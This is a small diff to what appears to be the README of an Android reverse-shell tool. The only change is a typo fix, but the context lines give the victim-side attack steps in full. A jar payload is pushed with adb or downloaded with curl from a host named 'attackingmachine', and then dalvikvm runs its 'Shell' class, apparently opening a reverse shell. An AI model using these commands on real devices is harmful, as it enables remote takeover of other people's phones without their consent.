@@ -18,7 +18,7 @@
 ## On victim Android device:
 `adb push reverse_ssl.jar /sdcard` (if Android Debug Tools is enabled)
 
-or you can just use dalvikvmfrom Termux:
+or you can just use dalvikvm from Termux:
 
 `curl http://attackingmachine:9999/reverse_ssl.jar -o /sdcard/reverse_ssl.jar`<br/>
 `cd /system/bin/ && ./dalvikvm -cp /sdcard/reverse_ssl.jar Shell`
